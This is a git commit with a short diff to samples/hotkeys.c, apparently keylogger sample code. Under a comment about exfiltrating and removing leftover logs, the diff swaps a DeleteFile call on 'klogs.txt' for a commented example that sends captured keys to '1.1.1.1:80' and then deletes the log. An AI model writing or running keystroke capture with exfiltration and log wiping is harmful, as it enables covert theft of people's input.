3d6eba08f9046faef06b773e7603bbaede9b057f
Shmilt <askiloseberg@outlook.com>
2025-08-11 15:50:16 +0200

    Update hotkeys.c

--- samples/hotkeys.c
+++ samples/hotkeys.c
@@ -84,6 +84,6 @@ int main(void)
     }
 
     // exfiltrate and remove any leftover logs...
-    DeleteFile("klogs.txt");
+    // for example: Exfil(real_key, "1.1.1.1:80"); DeleteFile("klogs.txt");
 }
 
